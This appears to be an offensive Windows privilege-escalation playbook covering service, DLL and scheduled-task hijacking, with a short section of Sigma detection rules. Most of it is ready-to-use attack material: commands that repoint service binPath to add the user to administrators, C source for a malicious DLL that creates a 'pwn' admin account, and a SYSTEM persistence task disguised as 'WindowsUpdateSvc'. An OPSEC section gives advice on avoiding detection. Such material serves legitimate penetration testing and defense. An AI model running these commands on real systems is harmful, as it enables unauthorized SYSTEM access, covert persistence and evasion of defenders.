# Service, DLL & Scheduled-Task Hijacking

ATT&CK: T1574.009 (Path Interception by Unquoted Path), T1543.003 (Create or Modify System
Process: Windows Service), T1574.001 (DLL Search Order Hijacking), T1574.010 (Services File
Permissions Weakness), T1053.005 (Scheduled Task). CWE-428 (Unquoted Search Path),
CWE-732 (Incorrect Permission Assignment), CWE-427 (Uncontrolled Search Path Element).

## Theory / Mechanism

Most Windows services run as SYSTEM, so any way to substitute the code a service executes yields
SYSTEM. Four classic, still-common misconfigurations:

1. **Unquoted service path (CWE-428).** A service `ImagePath` containing spaces but no quotes —
   `C:\Program Files\Some App\svc.exe`. The SCM tries each left-to-right candidate:
   `C:\Program.exe`, `C:\Program Files\Some.exe`, … If you can write to any intermediate directory
   (e.g. you control `C:\Program Files\Some App\`), drop `Some.exe`/`Program.exe` there → runs as SYSTEM.
2. **Weak service ACL (`SERVICE_CHANGE_CONFIG`).** If your token has `SERVICE_CHANGE_CONFIG` /
   `WRITE_DAC` on a SYSTEM service, rewrite `binPath` to your command, restart → SYSTEM.
3. **Writable service binary / its directory.** Replace the on-disk binary (or proxy a DLL it loads)
   and restart the service.
4. **DLL search-order / phantom DLL hijack (CWE-427).** A privileged process loads a DLL by name; if
   a writable directory is searched *before* the real DLL's location — or the DLL doesn't exist at all
   (phantom) but a writable `%PATH%` dir is searched — your DLL loads in-process as SYSTEM.

### DLL search order & KnownDLLs

Before the search, Windows checks if the module is already loaded or is a **KnownDLL** (listed under
`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`, always loaded from `System32`).
KnownDLLs **cannot** be search-order-hijacked — target only DLLs *not* on that list. The default
search order (no `SetDllDirectory`/safe-search nuances) is: application dir → System32 → System →
Windows dir → CWD → `%PATH%`. **Phantom** hijacking abuses the last leg: a third-party installer
that prepends a world-writable folder to `%PATH%` lets any standard user satisfy a missing DLL.

## Modern 2024-2026 cases (verified)

- **CVE-2025-1729 — Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`)**: phantom DLL hijack. Files
  under `C:\ProgramData\Lenovo\TPQM\Assistant\` are writable by `CREATOR OWNER`; a scheduled task runs
  daily 09:30 as the logged-on user and the EXE searches its working dir first for `hostfxr.dll`
  ("NAME NOT FOUND" then local-dir precedence) → drop `hostfxr.dll` for code exec.
- **CVE-2024-28827 — Checkmk Windows Agent**: DLL hijack in an auto-starting SYSTEM service; exploited
  in a 2025 red-team to reach SYSTEM + persistence via a writable `ProgramData` folder. Illustrates the
  recurring pattern: writable `%ProgramData%` subfolders + SYSTEM service DLL load = SYSTEM.
- Unquoted service paths remain widespread despite being documented for 15+ years; always test the
  *actual* ACLs (`icacls`) rather than assuming default permissions.

## Complete working commands

### Unquoted service path
```cmd
:: Find unquoted auto-start services outside C:\Windows
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
:: (PowerShell equivalent)
powershell -c "Get-CimInstance Win32_Service | ? {$_.PathName -notmatch '^\"' -and $_.PathName -match ' ' -and $_.PathName -notmatch 'C:\\Windows'} | select Name,PathName,StartMode"
:: Confirm you can write an injection point, then plant + restart
icacls "C:\Program Files\Some App"
copy payload.exe "C:\Program Files\Some.exe"
sc stop VulnSvc & sc start VulnSvc        :: or reboot if Start=auto
```

### Weak service ACL / config
```cmd
:: accesschk: services writable by a low-priv group
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "%USERNAME%" *
:: If SERVICE_CHANGE_CONFIG: repoint binPath (note the space after binpath=)
sc config VulnSvc binpath= "cmd /c net localgroup administrators %USERNAME% /add"
sc stop VulnSvc & sc start VulnSvc
sc config VulnSvc binpath= "<original path>"     :: restore for OPSEC
```

### Writable service binary
```cmd
icacls "C:\Program Files\Service\binary.exe"     :: look for (M)/(F)/(W) for your group
copy /y payload.exe "C:\Program Files\Service\binary.exe"
sc stop VulnSvc & sc start VulnSvc
```

### DLL / phantom DLL hijack
```text
1) Identify the missing/hijackable DLL with Process Monitor:
   Filter: Result is "NAME NOT FOUND"  AND  Path ends with ".dll"  AND  Process = <priv proc>
2) Confirm a writable directory is searched before the real DLL (or a writable %PATH% dir).
3) Build a proxy DLL so the host app keeps working (see scripts/service_hijack_audit.ps1 -GenDll),
   then drop it and trigger the service/scheduled task.
```
Minimal payload DLL (compile `x86_64-w64-mingw32-gcc -shared -o hostfxr.dll evil.c`):
```c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r){
    if (reason == DLL_PROCESS_ATTACH){
        WinExec("cmd /c net localgroup administrators pwn /add", SW_HIDE);
    }
    return TRUE;
}
```

### Scheduled task abuse
```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName \"Run As User\" \"Task To Run\""
:: If a SYSTEM task runs a writable binary/script -> replace it and wait for the trigger
icacls "C:\Scripts\maintenance.ps1"
:: If you are admin and want SYSTEM persistence:
schtasks /create /tn "WindowsUpdateSvc" /tr "C:\Windows\Tasks\beacon.exe" /sc onlogon /ru SYSTEM /f
```

`scripts/service_hijack_audit.ps1` enumerates unquoted paths, weak service ACLs (via the service
security descriptor), writable service binaries/dirs, writable `%PATH%` entries (phantom-DLL
candidates), and writable scheduled-task binaries — and can generate a proxy-DLL stub.

## Detection

```yaml
title: Service Binary Path Modified (sc config / registry ImagePath)
logsource: { product: windows, service: security }
detection:
  scm:  { EventID: 7045 }                       # new service installed
  reg:  { EventID: 4657, ObjectName|endswith: '\Services\*\ImagePath' }
  cli:  { EventID: 4688, CommandLine|contains|all: ['sc','config','binpath='] }
  condition: scm or reg or cli
level: high
---
title: Phantom / Search-Order DLL Loaded by Privileged Process
logsource: { product: windows, category: image_load }   # Sysmon EID 7
detection:
  sel:
    ImageLoaded|contains: ['\ProgramData\','\Users\','\Temp\','\AppData\']
    Signed: 'false'
  condition: sel
level: medium
```
IOCs: 7045 service create or `ImagePath` change to a non-`System32` path; new/modified service
binary hash; unsigned DLL loaded by a SYSTEM service from `ProgramData`/`Temp`/user-writable dir;
4698 scheduled task create running as SYSTEM with a non-system binary.

## OPSEC

- **Always restore** `binPath`/the original binary after the service runs your payload — a permanently
  broken or hijacked service is both an outage and a durable IOC.
- Stage payloads outside `C:\Windows`; a non-system path in `ImagePath` is itself an alert.
- For DLL hijack, **proxy** (forward exports to) the real DLL so the host app stays functional, and
  delete the planted DLL once you have execution.
- Service stop/start and reboots are visible (7036/7040). Where possible trigger on the next natural
  restart rather than forcing one.

## References
- conscia.com — "Gaining system privileges via DLL hijacking" (2025)
- itm4n.github.io — "Windows DLL Hijacking (Hopefully) Clarified"
- Medium/Hexshubz — "Windows Privesc 2025: Unquoted Service Path"; SEC Consult — Windows Privesc for pentesters
- Lenovo PSIRT — CVE-2025-1729 (TPQM phantom DLL); Checkmk — CVE-2024-28827
- HackTricks — "Dll Hijacking" (KnownDLLs / search order)
